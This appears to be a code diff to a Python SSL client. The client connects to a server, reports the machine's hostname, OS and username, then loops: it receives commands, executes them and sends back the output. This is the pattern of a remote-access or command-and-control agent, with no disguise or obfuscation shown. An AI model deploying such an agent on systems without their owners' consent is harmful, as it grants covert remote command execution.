@@ -1,6 +1,21 @@
 from client.client import SSLClient
-from client.system_info import get_system_info
+from utils.logger import setup_logger
 import json
+import platform
+import socket
+import getpass
+
+logger = setup_logger()
+
+
+def collect_client_info():
+
+    return {
+        "hostname": socket.gethostname(),
+        "os": platform.system(),
+        "user": getpass.getuser(),
+        "release": platform.release(),
+    }
 
 
 def main():
@@ -13,27 +28,37 @@ def main():
         client_key="../../certs/key.pem",
     )
 
-    client.connect()
-    info = get_system_info()
-    client.send(json.dumps(info))
+    try:
 
-    print("Connected to server")
+        client.connect()
 
-    while True:
+        print("Connected to server")
 
-        command = client.receive()
+        info = collect_client_info()
 
-        if command is None:
-            print("Server disconnected")
-            break
+        client.send(json.dumps(info))
 
-        print(f"Received command: {command}")
+        while True:
 
-        result = client.execute_command(command)
+            command = client.receive()
 
-        client.send(result)
+            if command is None:
+                print("Server disconnected")
+                break
 
-    client.close()
+            print("Received command:", command)
+
+            response = client.execute_command(command)
+
+            client.send(response)
+
+    except Exception as e:
+
+        print("Client error:", e)
+
+    finally:
+
+        client.close()
 
 
 if __name__ == "__main__":
